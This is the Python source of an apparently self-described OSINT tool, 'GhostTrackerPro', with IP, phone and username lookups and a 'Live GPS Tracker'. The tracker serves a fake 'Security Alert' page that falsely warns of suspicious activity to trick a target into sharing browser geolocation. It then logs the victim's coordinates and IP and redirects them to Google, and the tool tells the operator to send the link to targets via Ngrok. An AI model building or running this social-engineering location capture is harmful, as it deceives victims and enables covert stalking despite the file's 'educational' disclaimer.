import json
import time
import os
import sys
import requests
import phonenumbers
from phonenumbers import phonenumberutil
from sys import stderr
import argparse

from core import (
    track_ip, track_phone, track_username, get_my_ip,
    get_local_ip, save_result, ensure_logs_dir,
    LOGS_DIR, read_logs
)

try:
    from flask import Flask, request, jsonify, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

Bl = '\033[30m'
Re = '\033[1;31m'
Gr = '\033[1;32m'
Ye = '\033[1;33m'
Blu = '\033[1;34m'
Mage = '\033[1;35m'
Cy = '\033[1;36m'
Wh = '\033[1;37m'
Reset = '\033[0m'

app = None
TRACKING_DATA = []

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Security Alert</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
        h1 { color: #d93025; font-size: 24px; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 16px; line-height: 1.5; margin-bottom: 20px; }
        .icon { font-size: 50px; color: #d93025; margin-bottom: 20px; display: block; }
        button { background-color: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; }
        button:hover { background-color: #0056b3; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <span class="icon">&#9888;&#65039;</span>
        <h1>Security Alert</h1>
        <p>Your device has detected suspicious activity. To protect your data, a mandatory security verification is required immediately.</p>
        <p>Click the button below to verify your location and secure your device.</p>
        <button onclick="getLocation()">Verify & Secure Device</button>
        <div class="footer">Protected by System Security Protocol</div>
    </div>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }
        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;
            fetch('/capture?lat=' + lat + '&lon=' + lon + '&acc=' + acc)
                .then(response => {
                    if (response.ok) { window.location.href = "https://www.google.com"; }
                    else { alert("Error verifying location."); }
                });
        }
        function showError(error) {
            alert("Location access denied. Verification failed.");
        }
    </script>
</body>
</html>
'''


def start_server():
    global app
    app = Flask(__name__)

    @app.route('/')
    def index():
        ip = request.remote_addr
        print(f"\n{Gr}[!] NEW CONNECTION DETECTED!")
        print(f" Target IP: {ip}")
        print(f" Waiting for location permission...")
        return render_template_string(HTML_TEMPLATE)

    @app.route('/capture')
    def capture():
        lat = request.args.get('lat')
        lon = request.args.get('lon')
        acc = request.args.get('acc')
        ip = request.remote_addr

        if lat and lon:
            maps_url = f"https://www.google.com/maps?q={lat},{lon}"
            msg = f"""
{Gr}============================================================
[SUCCESS] GPS LOCATION CAPTURED!
Target IP: {ip}
Latitude: {lat}
Longitude: {lon}
Accuracy: {acc} meters
Google Maps: {maps_url}
============================================================{Reset}
"""
            print(msg)
            log_data = f"IP: {ip}\nLatitude: {lat}\nLongitude: {lon}\nAccuracy: {acc} meters\nMaps: {maps_url}"
            save_result("GPS_CAPTURE", log_data)
            TRACKING_DATA.append(f"IP: {ip}, Lat: {lat}, Lon: {lon}")
            return jsonify({"status": "success"}), 200
        return jsonify({"status": "failed"}), 400

    print(f"\n{Ye}[!] WARNING: This server is for educational purposes only.")
    print(f"{Ye}[!] Do not use without consent.{Reset}")
    time.sleep(2)
    app.run(host='0.0.0.0', port=5000, threaded=True)


def run_banner():
    clear()
    time.sleep(0.5)
    stderr.writelines(f"""{Wh}
         .-.
       .' `. {Wh}--------------------------------
       :g g : {Wh}| {Gr}GHOST - TRACKER - IP ADDRESS {Wh}|
       : o `. {Wh}| {Gr}@CODE BY HUNXBYTS {Wh}|
      : ``. {Wh}--------------------------------
     : `.
    : : . `.
    : : ` . `.
     `.. : `. ``;
        `:; `:'
           : `.
            `. `. .
              `'`'`'`---..,___`;.-'
        """)
    time.sleep(0.5)


def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def show_web_ui_info():
    print(f"\n{Wh}========== {Gr}WEB INTERFACE {Wh}==========")
    print(f"{Wh}GhostTrackerPro Web UI allows you to:")
    print(f"{Wh}  - Track IP addresses")
    print(f"{Wh}  - Look up phone numbers")
    print(f"{Wh}  - Search usernames across social media")
    print(f"{Wh}  - View your public IP")
    print(f"{Wh}  - Browse saved results")
    print(f"{Wh}  - Start the GPS tracker")
    print(f"{Ye}\nTo start: {Gr}python3 web/server.py{Reset}")
    print(f"{Wh}The web interface will be available at: {Gr}http://localhost:8080{Reset}")
    input(f"\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue{Reset}")


def live_gps_tracker():
    if not FLASK_AVAILABLE:
        print(f"\n{Re}[ERROR] Flask is not installed.")
        print(f"{Wh}Please install it first: {Gr}pip install flask{Reset}")
        input(f'\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue{Reset}')
        return

    print(f"\n{Wh}========== {Gr}LIVE GPS TRACKER {Wh}==========")
    print(f"{Wh}This feature creates a local server to capture real-time GPS.")
    print(f"{Wh}The target MUST click a link you send them and grant permission.")
    print(f"{Ye}\nWARNING: This only works if the target is on the same network OR if you use a tunneling service like Ngrok.{Reset}")

    choice = input(f"\n{Wh}[{Gr}1{Wh}] Start Server (Local IP)\n{Wh}[{Gr}2{Wh}] Back\n{Wh}Select: {Gr}")

    if choice == '1':
        local_ip = get_local_ip()
        print(f"\n{Gr}[+] Server started.")
        print(f"{Wh}Send this link to the target (if on same WiFi): {Gr}http://{local_ip}:5000{Reset}")
        print(f"\n{Ye}If the target is NOT on your WiFi, use Ngrok to expose this port.")
        print(f"{Wh}Press Ctrl+C to stop the server.{Reset}")
        try:
            start_server()
        except KeyboardInterrupt:
            print("\n\nServer stopped.")
    else:
        return


def IP_Track(ip=None):
    if ip is None:
        ip = input(f"{Wh}\n Enter IP target : {Gr}")
    print()
    print(f' {Wh}============= {Gr}SHOW INFORMATION IP ADDRESS {Wh}=============')
    try:
        data = track_ip(ip)
        time.sleep(1)
        r = f"""
{Wh} IP target     : {Gr}{data['ip']}
{Wh} Type          : {Gr}{data['type']}
{Wh} Country       : {Gr}{data['country']}
{Wh} City          : {Gr}{data['city']}
{Wh} Region        : {Gr}{data['region']}
{Wh} ISP           : {Gr}{data['isp']}
{Wh} Organization  : {Gr}{data['organization']}
{Wh} Coordinates   : {Gr}{data['latitude']}, {data['longitude']}
"""
        print(r)
        print(f"{Ye}[NOTE] This shows registration info, NOT real-time location.{Reset}")

        log_data = f"IP: {data['ip']}\nCountry: {data['country']}\nCity: {data['city']}\nRegion: {data['region']}\nISP: {data['isp']}\nOrganization: {data['organization']}\nCoordinates: {data['latitude']}, {data['longitude']}"

        if ip is None:
            sc = input(f"\n{Wh}Save result to file? [{Gr}y{Wh}/{Re}n{Wh}]: {Gr}")
            if sc.lower() == 'y':
                r2 = save_result("IP_TRACK", log_data)
                if r2.get("success"):
                    print(f"\n{Wh}[{Gr}+{Wh}] Result saved: {Gr}{r2['path']}{Reset}")
        else:
            r2 = save_result("IP_TRACK", log_data)
            if r2.get("success"):
                print(f"\n{Wh}[{Gr}+{Wh}] Result saved: {Gr}{r2['path']}{Reset}")

    except requests.exceptions.Timeout:
        print(f"{Re}Error: Request timed out. Try again later.{Reset}")
    except requests.exceptions.RequestException as e:
        print(f"{Re}Error fetching IP data: {e}{Reset}")
    except (KeyError, json.JSONDecodeError) as e:
        print(f"{Re}Error parsing response: {e}{Reset}")


def phoneGW(User_phone=None):
    if User_phone is None:
        User_phone = input(f"\n {Wh}Enter phone number target {Gr}Ex [+1415xxxxxxx] {Wh}: {Gr}")
    try:
        data = track_phone(User_phone)
        r = f"""
 {Wh}========== {Gr}SHOW INFORMATION PHONE NUMBERS {Wh}==========

 {Wh}Country Code     : {Gr}{data['country_code']}
 {Wh}National Number  : {Gr}{data['national_number']}
 {Wh}Location (Reg)   : {Gr}{data['location']}
 {Wh}Operator         : {Gr}{data['carrier']}
 {Wh}Timezone(s)      : {Gr}{data['timezone']}
 {Wh}Valid Number     : {Gr}{data['is_valid']}
"""
        print(r)
        print(f"{Ye}[NOTE] This shows carrier registration info, NOT real-time GPS location.")
        print(f"[NOTE] Real-time phone tracking requires spyware or legal warrants.{Reset}")

        log = f"Phone: {data['phone']}\nCountry Code: {data['country_code']}\nNational: {data['national_number']}\nLocation: {data['location']}\nCarrier: {data['carrier']}\nTimezone: {data['timezone']}\nValid: {data['is_valid']}"

        if User_phone is None:
            sc = input(f"\n{Wh}Save result to file? [{Gr}y{Wh}/{Re}n{Wh}]: {Gr}")
            if sc.lower() == 'y':
                r2 = save_result("PHONE_TRACK", log)
                if r2.get("success"):
                    print(f"\n{Wh}[{Gr}+{Wh}] Result saved: {Gr}{r2['path']}{Reset}")
        else:
            r2 = save_result("PHONE_TRACK", log)
            if r2.get("success"):
                print(f"\n{Wh}[{Gr}+{Wh}] Result saved: {Gr}{r2['path']}{Reset}")

    except phonenumbers.phonenumberutil.NumberParseException:
        print(f"{Re}Error: Invalid phone number format. Make sure to include the country code (e.g. +1415xxxxxxx).{Reset}")
    except Exception as e:
        print(f"{Re}Error: {e}{Reset}")


def TrackLu(username=None):
    if username is None:
        username = input(f"\n {Wh}Enter Username : {Gr}")
    print(f"\n {Wh}========== {Gr}SHOW INFORMATION USERNAME {Wh}==========")
    print(f"{Ye}Checking social media presence for '{username}'...{Reset}\n")

    data = track_username(username)
    found = []
    not_found = []
    blocked = []

    for r in data["results"]:
        if r["status"] == "found":
            print(f"{Wh}[{Gr}+{Wh}] {r['platform']}: {Gr}Found! {Wh}({r['url']})")
            found.append(f"{r['platform']}: {r['url']}")
        elif r["status"] == "not_found":
            print(f"{Wh}[{Re}-{Wh}] {r['platform']}: {Re}Not Found")
            not_found.append(r["platform"])
        elif r["status"] == "blocked":
            print(f"{Wh}[{Ye}?{Wh}] {r['platform']}: {Ye}Blocked/Captcha (Status {r.get('code', '?')})")
            blocked.append(r["platform"])
        else:
            print(f"{Wh}[{Re}!{Wh}] {r['platform']}: {Re}Error connecting")
            not_found.append(r["platform"])

    print(f"\n{Ye}[NOTE] Some sites may show False Positives/Negatives due to anti-bot protection.{Reset}")

    if found:
        log = f"Username: {username}\n\nFound on:\n" + "\n".join(found)
        if not_found:
            log += f"\n\nNot found on:\n" + "\n".join(not_found)
        if blocked:
            log += f"\n\nBlocked/Error on:\n" + "\n".join(blocked)

        if username is None:
            sc = input(f"\n{Wh}Save result to file? [{Gr}y{Wh}/{Re}n{Wh}]: {Gr}")
            if sc.lower() == 'y':
                r2 = save_result("USERNAME_TRACK", log)
                if r2.get("success"):
                    print(f"\n{Wh}[{Gr}+{Wh}] Result saved: {Gr}{r2['path']}{Reset}")
        else:
            r2 = save_result("USERNAME_TRACK", log)
            if r2.get("success"):
                print(f"\n{Wh}[{Gr}+{Wh}] Result saved: {Gr}{r2['path']}{Reset}")


def showIP():
    try:
        data = get_my_ip()
        r = f"""
 {Wh}========== {Gr}SHOW INFORMATION YOUR IP {Wh}==========

 {Wh}[{Gr} + {Wh}] Your IP Address : {Gr}{data['ip']}
"""
        if 'isp' in data:
            r += f"\n {Wh}ISP             : {Gr}{data.get('isp', 'N/A')}"
            r += f"\n {Wh}Country         : {Gr}{data.get('country', 'N/A')}"
            r += f"\n {Wh}City            : {Gr}{data.get('city', 'N/A')}"
        r += f"\n\n {Wh}=============================================="
        print(r)
    except requests.exceptions.RequestException:
        print(f"{Re}Failed to retrieve IP.{Reset}")


def setup_argparse():
    parser = argparse.ArgumentParser(
        description='GhostTrackerPro - OSINT and Educational Tracking Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 GhostTrackerPro.py                       # Interactive menu mode
  python3 GhostTrackerPro.py --ip 8.8.8.8           # Lookup IP address
  python3 GhostTrackerPro.py --phone +14155552671    # Lookup phone number
  python3 GhostTrackerPro.py --username johndoe      # Search username
  python3 GhostTrackerPro.py --myip                  # Show your IP
  python3 GhostTrackerPro.py --gps                   # Start GPS tracker
  python3 GhostTrackerPro.py --web                   # Start web interface
        """
    )
    parser.add_argument('--ip', type=str, metavar='ADDRESS', help='Lookup an IP address')
    parser.add_argument('--phone', type=str, metavar='NUMBER', help='Lookup a phone number (with country code, e.g. +1415xxxxxxx)')
    parser.add_argument('--username', type=str, metavar='USERNAME', help='Search for a username across social media')
    parser.add_argument('--myip', action='store_true', help='Show your public IP address')
    parser.add_argument('--gps', action='store_true', help='Start the live GPS tracker server')
    parser.add_argument('--web', action='store_true', help='Start the web interface')
    return parser


def start_web_server():
    try:
        from web.server import app as web_app
        local_ip = get_local_ip()
        print(f"\n{Gr}[+] Web interface starting...{Reset}")
        print(f"{Wh}Local:   {Gr}http://localhost:8080{Reset}")
        print(f"{Wh}Network: {Gr}http://{local_ip}:8080{Reset}")
        print(f"{Wh}Press Ctrl+C to stop.{Reset}\n")
        web_app.run(host='0.0.0.0', port=8080, debug=False)
    except ImportError:
        print(f"\n{Re}[ERROR] Could not start web interface.{Reset}")
        print(f"{Wh}Make sure Flask is installed: {Gr}pip install flask{Reset}")
        input(f"\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue{Reset}")
    except Exception as e:
        print(f"\n{Re}[ERROR] {e}{Reset}")
        input(f"\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue{Reset}")


def run_cli_mode(args):
    if args.web:
        start_web_server()
        return True
    if args.ip:
        run_banner()
        IP_Track(args.ip)
        return True
    if args.phone:
        run_banner()
        phoneGW(args.phone)
        return True
    if args.username:
        run_banner()
        TrackLu(args.username)
        return True
    if args.myip:
        run_banner()
        showIP()
        return True
    if args.gps:
        run_banner()
        live_gps_tracker()
        return True
    return False

options = [
    {'num': 1, 'text': 'IP Tracker (Info Only)', 'func': IP_Track},
    {'num': 2, 'text': 'Show Your IP', 'func': showIP},
    {'num': 3, 'text': 'Phone Number Tracker (Info Only)', 'func': phoneGW},
    {'num': 4, 'text': 'Username Tracker', 'func': TrackLu},
    {'num': 5, 'text': 'Live GPS Tracker', 'func': live_gps_tracker},
    {'num': 6, 'text': 'Web Interface (Browser UI)', 'func': start_web_server},
    {'num': 0, 'text': 'Exit', 'func': None}
]


def call_option(opt):
    for option in options:
        if option['num'] == opt:
            if option['func'] is None:
                print(f"\n{Wh}[ {Gr}+ {Wh}] {Gr}Exiting...{Reset}")
                sys.exit(0)
            option['func']()
            return
    print(f"{Re}Option not found{Reset}")


def option_text():
    text = ''
    for opt in options:
        text += f'{Wh}[ {opt["num"]} ] {Gr}{opt["text"]}\n'
    return text


def option():
    clear()
    stderr.writelines(fr"""
       ________ __ ______ __
      / ____/ /_ ____ _____/ /_ /_ __/________ ______/ /__
     / / __/ __ \/ __ \/ ___/ __/_____/ / / ___/ __ `/ ___/ //_/
    / /_/ / / / / /_/ (__ ) /_/_____/ / / / / /_/ / /__/ ,<
    \____/_/ /_/\____/____/\__/ /_/ /_/ \__,_/\___/_/|_|
              {Wh}[ + ] C O D E B Y H U N X [ + ]
    """)
    stderr.writelines(f"\n\n\n{option_text()}")


def check_dependencies():
    missing = []
    try:
        import requests
    except ImportError:
        missing.append("requests")
    try:
        import phonenumbers
    except ImportError:
        missing.append("phonenumbers")
    if missing:
        print(f"{Re}[ERROR] Missing required dependencies: {', '.join(missing)}{Reset}")
        print(f"{Wh}Install them with: {Gr}pip install {' '.join(missing)}{Reset}")
        return False
    return True


def main():
    ensure_logs_dir()
    parser = setup_argparse()
    args = parser.parse_args()

    has_cli_args = any([args.ip, args.phone, args.username, args.myip, args.gps, args.web])
    if has_cli_args:
        run_cli_mode(args)
        return

    if not check_dependencies():
        input(f"\n{Wh}Press Enter to exit...{Reset}")
        sys.exit(1)

    while True:
        try:
            option()
            opt_input = input(f"{Wh}\n [ + ] {Gr}Select Option : {Wh}").strip()
            if not opt_input:
                continue
            opt = int(opt_input)
            if opt == 0:
                print(f"\n{Wh}[ {Gr}+ {Wh}] {Gr}Exiting...{Reset}")
                break
            call_option(opt)
            if opt != 0:
                input(f'\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue{Reset}')
        except KeyboardInterrupt:
            print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit{Reset}')
            break
        except ValueError:
            print(f'\n{Wh}[ {Re}! {Wh}] {Re}Please input a valid number{Reset}')
            time.sleep(1.5)
        except Exception as e:
            print(f"{Re}Unexpected error: {e}{Reset}")
            time.sleep(1.5)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit{Reset}')
        sys.exit(0)
